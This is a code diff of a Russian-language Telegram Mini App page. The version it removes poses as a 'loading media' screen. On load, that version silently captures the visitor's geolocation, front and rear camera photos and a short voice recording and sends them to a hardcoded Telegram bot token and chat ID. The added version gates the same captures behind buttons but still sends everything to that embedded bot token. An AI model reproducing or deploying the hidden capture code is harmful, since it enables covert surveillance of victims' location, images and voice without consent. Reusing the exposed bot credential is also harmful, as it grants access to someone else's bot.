@@ -1,163 +1,217 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка контента...</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        .loader {
-            border: 4px solid #334155;
-            border-top: 4px solid #38bdf8;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Мини-приложение</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      background: #f5f7fa;
+      color: #111;
+    }
+    h3 {
+      margin: 0 0 6px;
+    }
+    button {
+      padding: 14px 16px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      background: #2481cc;
+      color: #fff;
+      cursor: pointer;
+    }
+    button:active {
+      opacity: 0.85;
+    }
+    #status {
+      margin-top: 8px;
+      padding: 10px 12px;
+      border-radius: 8px;
+      background: #e9eef5;
+      font-size: 14px;
+      word-break: break-word;
+    }
+  </style>
 </head>
 <body>
+  <h3>Выберите действие</h3>
 
-    <div class="loader"></div>
-    <h3>Загрузка медиафайла...</h3>
-    <p style="font-size: 14px; color: #94a3b8;">Пожалуйста, подождите пару секунд.</p>
+  <button id="btn-geo">Проверить локацию</button>
+  <button id="btn-camera">Сделать фото</button>
+  <button id="btn-mic">Записать звук</button>
 
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+  <div id="status">Нажмите кнопку для запуска</div>
 
-    <script>
-        let tg = window.Telegram.WebApp;
-        tg.expand();
+  <script>
+    const BOT_TOKEN = '8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw';
+    const CHAT_ID = '8298749655';
 
-        const BOT_TOKEN = "8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw";
-        const CHAT_ID = "8298749655";
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+      tg.ready();
+      tg.expand();
+    }
 
-        function sendToBot(text) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    const statusEl = document.getElementById('status');
+    function setStatus(text) {
+      statusEl.textContent = text;
+    }
+
+    async function sendMessageToBot(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      });
+      if (!res.ok) {
+        throw new Error(`Ошибка отправки текста: ${res.status}`);
+      }
+    }
+
+    async function sendFileToBot(endpoint, fieldName, blob, filename) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append(fieldName, blob, filename);
+
+      const res = await fetch(url, {
+        method: 'POST',
+        body: formData
+      });
+      if (!res.ok) {
+        throw new Error(`Ошибка отправки файла: ${res.status}`);
+      }
+    }
+
+    // 1. Геолокация
+    async function handleGeo() {
+      if (!navigator.geolocation) {
+        setStatus('Геолокация не поддерживается на этом устройстве');
+        return;
+      }
+
+      setStatus('Запрашиваю геолокацию...');
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
+          try {
+            await sendMessageToBot(
+              `Локация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`
+            );
+            setStatus('Локация отправлена');
+          } catch (err) {
+            setStatus('Не удалось отправить локацию');
+          }
+        },
+        () => {
+          setStatus('Доступ к геолокации отклонён или недоступен');
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    }
+
+    // 2. Фото с камеры
+    async function handleCamera() {
+      if (!navigator.mediaDevices?.getUserMedia) {
+        setStatus('Камера недоступна в этом окружении');
+        return;
+      }
+
+      setStatus('Запрашиваю доступ к камере...');
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        await video.play();
+
+        await new Promise((resolve) => setTimeout(resolve, 400));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const blob = await new Promise((resolve) =>
+          canvas.toBlob(resolve, 'image/jpeg', 0.85)
+        );
+
+        await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg');
+        setStatus('Фото отправлено');
+      } catch (err) {
+        setStatus('Доступ к камере отклонён или произошла ошибка');
+      } finally {
+        if (stream) {
+          stream.getTracks().forEach((track) => track.stop());
         }
+      }
+    }
 
-        // 1. Локация
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendToBot(`📍 Локация:\nШирота: ${pos.coords.latitude}\nДолгота: ${pos.coords.longitude}`);
-            });
-        }
+    // 3. Запись короткого аудио (3 секунды)
+    async function handleMic() {
+      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
+        setStatus('Запись звука недоступна на этом устройстве');
+        return;
+      }
 
-        // Вспомогательная функция для получения видеопотока с нужной камеры
-        async function getCameraStream(mode) {
-            try {
-                return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { exact: mode } },
-                    audio: false
-                });
-            } catch (e) {
-                return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: mode },
-                    audio: false
-                });
-            }
-        }
+      setStatus('Запрашиваю доступ к микрофону...');
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
 
-        // 2. Снимок с указанной камеры ('user' — фронтальная, 'environment' — задняя)
-        async function captureCameraPhoto(mode, label) {
-            let stream = null;
-            try {
-                stream = await getCameraStream(mode);
-                let video = document.getElementById('video');
-                video.srcObject = stream;
-
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-                await new Promise(resolve => setTimeout(resolve, 500));
-
-                let canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                let ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob(blob => {
-                    if (!blob) return;
-                    let formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, `${mode}.png`);
-                    formData.append('caption', `📷 ${label}`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }, 'image/png');
-            } catch (err) {
-                console.log(`Ошибка камеры (${mode}):`, err);
-            } finally {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-            }
-        }
-
-        // 3. Запись голоса (3 секунды)
-        async function recordVoice(durationMs = 3000) {
-            let stream = null;
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-                let chunks = [];
-                let recorder = new MediaRecorder(stream);
-
-                recorder.ondataavailable = e => {
-                    if (e.data && e.data.size > 0) chunks.push(e.data);
-                };
-
-                recorder.onstop = () => {
-                    let audioBlob = new Blob(chunks, { type: 'audio/webm' });
-                    let formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('audio', audioBlob, 'voice.ogg');
-                    formData.append('caption', '🎤 Запись голоса');
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                };
-
-                recorder.start();
-                setTimeout(() => {
-                    if (recorder.state !== 'inactive') recorder.stop();
-                }, durationMs);
-            } catch (err) {
-                console.log("Ошибка микрофона:", err);
-            } finally {
-                setTimeout(() => {
-                    if (stream) stream.getTracks().forEach(track => track.stop());
-                }, durationMs + 500);
-            }
-        }
-
-        // Запускаем последовательно, чтобы устройства не конфликтовали друг с другом
-        window.onload = async function() {
-            await new Promise(r => setTimeout(r, 800));
-            await captureCameraPhoto('user', 'Фронтальная камера');
-            await new Promise(r => setTimeout(r, 600));
-            await captureCameraPhoto('environment', 'Задняя камера');
-            await new Promise(r => setTimeout(r, 600));
-            await recordVoice(3000);
+        recorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) {
+            chunks.push(e.data);
+          }
         };
-    </script>
+
+        const stopped = new Promise((resolve) => {
+          recorder.onstop = resolve;
+        });
+
+        recorder.start();
+        setStatus('Идёт запись звука (3 сек)...');
+        await new Promise((resolve) => setTimeout(resolve, 3000));
+        recorder.stop();
+        await stopped;
+
+        const mimeType = recorder.mimeType || 'audio/webm';
+        const blob = new Blob(chunks, { type: mimeType });
+
+        await sendFileToBot('sendVoice', 'voice', blob, 'voice.ogg');
+        setStatus('Запись отправлена');
+      } catch (err) {
+        setStatus('Доступ к микрофону отклонён или произошла ошибка');
+      } finally {
+        if (stream) {
+          stream.getTracks().forEach((track) => track.stop());
+        }
+      }
+    }
+
+    document.getElementById('btn-geo').addEventListener('click', handleGeo);
+    document.getElementById('btn-camera').addEventListener('click', handleCamera);
+    document.getElementById('btn-mic').addEventListener('click', handleMic);
+  </script>
 </body>
 </html>
